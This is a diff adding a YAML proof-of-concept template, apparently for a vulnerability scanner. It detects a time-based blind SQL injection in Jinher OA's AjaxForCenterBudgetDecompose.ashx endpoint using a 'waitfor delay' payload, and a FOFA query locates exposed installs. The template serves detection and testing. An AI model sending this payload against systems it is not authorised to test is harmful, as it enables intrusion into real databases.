@@ -1,0 +1,29 @@
+id: poc-yaml-jinher-jhsoft-ajaxforcenterbudgetdecompose-ashx-sqli
+info:
+  name: 金和OA AjaxForCenterBudgetDecompose.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /c6/JHSoft.Web.CostControl/Decompose/AjaxForCenterBudgetDecompose.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: strType=getBudgetTime&strDeptId=1&strYear=2012&type=1'waitfor+delay%270:0:{{.t1}}%27--&TimeType=1
+  expression: 'status_code == 200 &&
+
+    body == "" &&
+
+    contains(headers,"Cookie:") &&
+
+    duration >= t1 &&
+
+    duration <= t2
+
+    '
+transport: http
